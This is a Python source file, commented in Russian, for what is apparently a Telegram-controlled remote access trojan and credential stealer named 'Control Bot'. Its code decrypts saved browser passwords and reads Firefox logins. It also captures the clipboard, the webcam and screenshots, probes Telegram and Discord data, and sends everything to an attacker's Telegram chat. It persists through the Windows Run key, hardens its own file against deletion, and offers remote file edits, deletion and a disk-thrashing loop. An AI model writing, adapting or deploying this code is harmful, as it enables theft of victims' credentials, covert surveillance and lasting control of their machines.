import os
import datetime
import threading
import time
import random
import sys
import requests
import platform
import wmi
import telebot
from telebot import types
import shutil
import psutil
import winreg
import subprocess
import json
import base64
import win32clipboard
import win32security
import ntsecuritycon as con
import cv2
from PIL import ImageGrab
import sqlite3
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
import glob
import ctypes

# Токен бота Telegram и ID чата
TELEGRAM_TOKEN = "___"
TELEGRAM_CHAT_ID = "___"  # Ваш Telegram ID

# Глобальные переменные
stop_program = False  # Флаг остановки нагрузки
stress_thread = None  # Поток для нагрузки
program_running = threading.Event()  # Событие для работы программы
program_running.set()  # Программа запущена по умолчанию
bot = telebot.TeleBot(TELEGRAM_TOKEN)  # Инициализация бота
client_id = None  # Уникальный ID клиента (IP)
active_clients = {}  # Словарь активных клиентов {IP: address}
selected_client = None  # Выбранный клиент для команд

# Проверка прав администратора
def is_admin():
    """Проверяет, запущена ли программа с правами администратора."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Защита процесса от завершения
def protect_process():
    """Защищает процесс программы от завершения другими пользователями."""
    process = psutil.Process(os.getpid())
    exe_path = sys.argv[0]
    sid_admin = win32security.LookupAccountName("", "Administrators")[0]
    dacl = win32security.ACL()
    dacl.AddAccessAllowedAce(win32security.ACL_REVISION, con.PROCESS_ALL_ACCESS, sid_admin)
    win32security.SetNamedSecurityInfo(
        exe_path, win32security.SE_FILE_OBJECT,
        win32security.DACL_SECURITY_INFORMATION,
        None, None, dacl, None
    )
    bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Процесс защищён от завершения.")

# Снятие защиты процесса
def unprotect_process():
    """Снимает защиту с процесса программы."""
    exe_path = sys.argv[0]
    subprocess.run(f"icacls \"{exe_path}\" /reset", shell=True, check=True)
    bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Защита процесса снята.")

# Получение системной информации
def get_system_info():
    """Собирает информацию о системе: IP, местоположение, версию Windows и т.д."""
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        ip = data.get("ip", "Неизвестно")
        loc = data.get("loc", "Неизвестно").split(",")
        lat, lon = loc[0], loc[1]
        geo_response = requests.get(f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json", headers={"User-Agent": "LexoBot"})
        geo_data = geo_response.json()
        address = geo_data.get("display_name", "Неизвестно")
    except:
        ip = "Неизвестно"
        address = "Неизвестно"
    windows_version = platform.platform()
    try:
        c = wmi.WMI()
        for os in c.Win32_OperatingSystem():
            windows_key = os.SerialNumber
            last_boot = os.LastBootUpTime.split('.')[0]
            last_boot_time = datetime.datetime.strptime(last_boot, "%Y%m%d%H%M%S")
            time_since_boot = datetime.datetime.now() - last_boot_time
            break
    except:
        windows_key = "Неизвестно"
        time_since_boot = "Неизвестно"
    active_clients[ip] = address  # Добавляем клиента в список активных
    return ip, address, f"IP: {ip}\nМестоположение: {address}\nВерсия Windows: {windows_version}\nКлюч Windows: {windows_key}\nВремя с последней загрузки: {time_since_boot}"

# Нагрузка на ПК
def stress_pc():
    """Создаёт нагрузку на ПК, генерируя и удаляя временные папки."""
    global stop_program
    base_dir = "stress_test"
    if not os.path.exists(base_dir):
        os.makedirs(base_dir)
    while not stop_program and program_running.is_set():
        for _ in range(532):
            folder_name = os.path.join(base_dir, f"temp_{random.randint(1, 10000)}")
            os.makedirs(folder_name, exist_ok=True)
        time.sleep(0.1)
        for folder in os.listdir(base_dir):
            shutil.rmtree(os.path.join(base_dir, folder), ignore_errors=True)
    shutil.rmtree(base_dir, ignore_errors=True)
    bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Нагрузка остановлена")

# Редактирование файла
def edit_file(path, content):
    """Редактирует содержимое указанного файла."""
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Файл {path} успешно отредактирован")
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Не удалось отредактировать файл: {str(e)}")

# Создание файла
def add_file(path, content):
    """Создаёт новый файл с заданным содержимым."""
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Файл {path} успешно создан")
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Не удалось создать файл: {str(e)}")

# Удаление файла
def delete_file(path):
    """Удаляет файл по указанному пути."""
    try:
        os.remove(path)
        bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Файл {path} успешно удалён")
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Не удалось удалить файл: {str(e)}")

# Получение содержимого буфера обмена
def get_clipboard():
    """Извлекает текст из буфера обмена."""
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Содержимое буфера обмена: {data}")
    except:
        bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Не удалось получить доступ к буферу обмена")

# Снимок с веб-камеры
def get_webcam_shot():
    """Делает снимок с веб-камеры и отправляет его в Telegram."""
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Веб-камера не обнаружена")
        return
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("webcam_shot.jpg", frame)
        with open("webcam_shot.jpg", "rb") as f:
            bot.send_photo(TELEGRAM_CHAT_ID, f, caption=f"[{client_id}] Снимок с веб-камеры")
        os.remove("webcam_shot.jpg")
    cap.release()

# Список активных процессов
def get_processes():
    """Возвращает список активных процессов (PID и имя)."""
    processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
    process_list = "\n".join([f"PID: {p['pid']}, Имя: {p['name']}" for p in processes[:50]])
    bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Активные процессы:\n{process_list}")

# Расшифровка паролей
def decrypt_password(encrypted_value, key):
    """Расшифровывает пароли из браузеров с использованием ключа."""
    try:
        iv = encrypted_value[3:15]
        encrypted_value = encrypted_value[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(encrypted_value)[:-16].decode()
        return decrypted
    except:
        return "Не удалось расшифровать"

# Получение ключа шифрования
def get_encryption_key(browser_path):
    """Извлекает ключ шифрования из файла Local State браузера."""
    local_state_path = os.path.join(os.path.dirname(browser_path), "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # Удаляем "DPAPI"
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

# Стиллер данных
def steal_data():
    """Извлекает данные из браузеров, Telegram, Discord и делает скриншот рабочего стола."""
    results = []
    browsers = {
        "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
        "Firefox": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
        "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
        "Opera": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"),
        "Yandex": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data")
    }
    
    for browser, path in browsers.items():
        if browser == "Firefox":
            profiles = [os.path.join(path, p) for p in os.listdir(path) if os.path.isdir(os.path.join(path, p))]
            for profile in profiles:
                db_path = os.path.join(profile, "logins.json")
                if os.path.exists(db_path):
                    with open(db_path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                        for login in data["logins"]:
                            results.append(f"{browser}: URL: {login['origin_url']}, Email: {login['username']}, Пароль: {login['password']}")
        else:
            if os.path.exists(path):
                key = get_encryption_key(path)
                if not key:
                    results.append(f"{browser}: Не удалось получить ключ шифрования")
                    continue
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, email, encrypted_pwd = row
                    if encrypted_pwd:
                        pwd = decrypt_password(encrypted_pwd, key)
                        results.append(f"{browser}: URL: {url}, Email: {email}, Пароль: {pwd}")
                    else:
                        results.append(f"{browser}: URL: {url}, Email: {email}, Пароль: Не зашифрован")
                conn.close()

    telegram_path = os.path.expanduser("~\\AppData\\Roaming\\Telegram Desktop\\tdata")
    if os.path.exists(telegram_path):
        for file in glob.glob(f"{telegram_path}\\*"):
            if os.path.isfile(file):
                results.append(f"Telegram: Найден файл {os.path.basename(file)}")

    discord_path = os.path.expanduser("~\\AppData\\Roaming\\discord\\Local Storage\\leveldb")
    if os.path.exists(discord_path):
        for file in glob.glob(f"{discord_path}\\*.ldb"):
            with open(file, "rb") as f:
                content = f.read(1000)
                results.append(f"Discord: Найдены данные в {os.path.basename(file)}")

    screenshot = ImageGrab.grab()
    screenshot.save("desktop_shot.png")
    with open("desktop_shot.png", "rb") as f:
        bot.send_photo(TELEGRAM_CHAT_ID, f, caption=f"[{client_id}] Скриншот рабочего стола")
    os.remove("desktop_shot.png")
    bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Украденные данные:\n" + "\n".join(results[:50]))

# Добавление в автозагрузку
def add_to_startup():
    """Добавляет программу в автозагрузку Windows и защищает файл."""
    exe_path = os.path.abspath(sys.argv[0])
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "ControlBot", 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)
    subprocess.run(f"icacls \"{exe_path}\" /inheritance:d", shell=True, check=True)
    subprocess.run(f"icacls \"{exe_path}\" /grant Administrators:F", shell=True, check=True)
    subprocess.run(f"icacls \"{exe_path}\" /deny Everyone:D", shell=True, check=True)
    bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Добавлено в автозагрузку. Файл защищён.")

# Удаление из автозагрузки
def remove_from_startup():
    """Удаляет программу из автозагрузки и снимает защиту файла."""
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.DeleteValue(key, "ControlBot")
    winreg.CloseKey(key)
    exe_path = os.path.abspath(sys.argv[0])
    subprocess.run(f"icacls \"{exe_path}\" /inheritance:e", shell=True, check=True)
    subprocess.run(f"icacls \"{exe_path}\" /remove:d Everyone", shell=True, check=True)
    subprocess.run(f"icacls \"{exe_path}\" /reset", shell=True, check=True)
    bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Удалено из автозагрузки. Файл теперь можно удалить.")

# Обработчики команд Telegram
@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Отправляет приветственное сообщение с меню команд."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID:
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Выбрать ПК")
    btn2 = types.KeyboardButton("Получить информацию о системе")
    btn3 = types.KeyboardButton("Начать нагрузку")
    btn4 = types.KeyboardButton("Остановить нагрузку")
    btn5 = types.KeyboardButton("Запустить программу")
    btn6 = types.KeyboardButton("Остановить программу")
    btn7 = types.KeyboardButton("Редактировать файл")
    btn8 = types.KeyboardButton("Добавить файл")
    btn9 = types.KeyboardButton("Удалить файл")
    btn10 = types.KeyboardButton("Получить буфер обмена")
    btn11 = types.KeyboardButton("Сделать снимок с веб-камеры")
    btn12 = types.KeyboardButton("Получить процессы")
    btn13 = types.KeyboardButton("Украсть данные")
    btn14 = types.KeyboardButton("Добавить в автозагрузку")
    btn15 = types.KeyboardButton("Удалить из автозагрузки")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11, btn12, btn13, btn14, btn15)
    bot.reply_to(message, f"[{client_id}] Добро пожаловать в Control Bot! Используйте команды ниже.", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Выбрать ПК")
def handle_select_pc(message):
    """Позволяет выбрать активный ПК из списка."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID:
        return
    if not active_clients:
        bot.reply_to(message, "Нет подключённых ПК.")
        return
    client_list = "\n".join([f"{i+1}. IP: {ip}, Местоположение: {addr}" for i, (ip, addr) in enumerate(active_clients.items())])
    bot.reply_to(message, f"Доступные ПК:\n{client_list}\nВведите номер ПК для выбора:")
    bot.register_next_step_handler(message, select_pc_step)

def select_pc_step(message):
    """Обрабатывает выбор ПК по номеру."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID:
        return
    try:
        index = int(message.text) - 1
        global selected_client
        selected_client = list(active_clients.keys())[index]
        bot.reply_to(message, f"Выбран ПК с IP: {selected_client}, Местоположение: {active_clients[selected_client]}")
    except (ValueError, IndexError):
        bot.reply_to(message, "Неверный номер ПК. Попробуйте снова.")

@bot.message_handler(func=lambda message: message.text == "Получить информацию о системе")
def handle_system_info(message):
    """Обрабатывает запрос системной информации."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    _, _, info = get_system_info()
    bot.reply_to(message, f"[{client_id}] {info}")

@bot.message_handler(func=lambda message: message.text == "Начать нагрузку")
def handle_start_stress(message):
    """Запускает нагрузку на ПК."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    global stop_program, stress_thread
    if stress_thread and stress_thread.is_alive():
        bot.reply_to(message, f"[{client_id}] Нагрузка уже запущена!")
        return
    stop_program = False
    stress_thread = threading.Thread(target=stress_pc)
    stress_thread.start()
    bot.reply_to(message, f"[{client_id}] Нагрузка на ПК началась... Используйте 'Остановить нагрузку' для остановки")

@bot.message_handler(func=lambda message: message.text == "Остановить нагрузку")
def handle_stop_stress(message):
    """Останавливает нагрузку на ПК."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    global stop_program, stress_thread
    stop_program = True
    if stress_thread:
        stress_thread.join()
    bot.reply_to(message, f"[{client_id}] Нагрузка остановлена!")

@bot.message_handler(func=lambda message: message.text == "Запустить программу")
def handle_start_program(message):
    """Возобновляет работу программы."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    if not program_running.is_set():
        program_running.set()
        protect_process()
        bot.reply_to(message, f"[{client_id}] Программа возобновлена!")
    else:
        bot.reply_to(message, f"[{client_id}] Программа уже запущена!")

@bot.message_handler(func=lambda message: message.text == "Остановить программу")
def handle_stop_program(message):
    """Приостанавливает работу программы."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    if program_running.is_set():
        program_running.clear()
        unprotect_process()
        bot.reply_to(message, f"[{client_id}] Программа приостановлена в фоновом режиме!")
    else:
        bot.reply_to(message, f"[{client_id}] Программа уже приостановлена!")

@bot.message_handler(func=lambda message: message.text == "Редактировать файл")
def handle_edit_file(message):
    """Запрашивает путь и содержимое для редактирования файла."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    bot.reply_to(message, f"[{client_id}] Введите путь к файлу и новое содержимое (например, 'C:\\test.txt Привет, мир'):")
    bot.register_next_step_handler(message, edit_file_step)

def edit_file_step(message):
    """Обрабатывает редактирование файла."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    try:
        path, content = message.text.split(" ", 1)
        edit_file(path, content)
    except ValueError:
        bot.reply_to(message, f"[{client_id}] Укажите путь и содержимое через пробел.")

@bot.message_handler(func=lambda message: message.text == "Добавить файл")
def handle_add_file(message):
    """Запрашивает путь и содержимое для создания файла."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    bot.reply_to(message, f"[{client_id}] Введите путь к файлу и содержимое (например, 'C:\\test.txt Привет, мир'):")
    bot.register_next_step_handler(message, add_file_step)

def add_file_step(message):
    """Обрабатывает создание файла."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    try:
        path, content = message.text.split(" ", 1)
        add_file(path, content)
    except ValueError:
        bot.reply_to(message, f"[{client_id}] Укажите путь и содержимое через пробел.")

@bot.message_handler(func=lambda message: message.text == "Удалить файл")
def handle_delete_file(message):
    """Запрашивает путь для удаления файла."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    bot.reply_to(message, f"[{client_id}] Введите путь к файлу для удаления (например, 'C:\\test.txt'):")
    bot.register_next_step_handler(message, delete_file_step)

def delete_file_step(message):
    """Обрабатывает удаление файла."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    path = message.text.strip()
    delete_file(path)

@bot.message_handler(func=lambda message: message.text == "Получить буфер обмена")
def handle_get_clipboard(message):
    """Получает содержимое буфера обмена."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    get_clipboard()

@bot.message_handler(func=lambda message: message.text == "Сделать снимок с веб-камеры")
def handle_get_webcam_shot(message):
    """Делает снимок с веб-камеры."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    threading.Thread(target=get_webcam_shot).start()

@bot.message_handler(func=lambda message: message.text == "Получить процессы")
def handle_get_processes(message):
    """Получает список активных процессов."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    threading.Thread(target=get_processes).start()

@bot.message_handler(func=lambda message: message.text == "Украсть данные")
def handle_steal_data(message):
    """Извлекает данные с ПК."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    threading.Thread(target=steal_data).start()

@bot.message_handler(func=lambda message: message.text == "Добавить в автозагрузку")
def handle_add_startup(message):
    """Добавляет программу в автозагрузку."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    threading.Thread(target=add_to_startup).start()

@bot.message_handler(func=lambda message: message.text == "Удалить из автозагрузки")
def handle_remove_startup(message):
    """Удаляет программу из автозагрузки."""
    if str(message.chat.id) != TELEGRAM_CHAT_ID or selected_client != client_id:
        return
    threading.Thread(target=remove_from_startup).start()

# Главная функция
def main():
    """Запускает программу."""
    global client_id
    if not is_admin():
        print("Программа должна быть запущена от имени администратора!")
        sys.exit(1)

    protect_process()
    ip, address, info = get_system_info()
    client_id = ip  # Устанавливаем IP как ID клиента
    bot.send_message(TELEGRAM_CHAT_ID, f"[{client_id}] Программа запущена:\n{info}")
    
    while True:
        program_running.wait()
        bot.polling(none_stop=True, interval=0)

if __name__ == "__main__":
    threading.Thread(target=main).start()
    sys.exit(0)
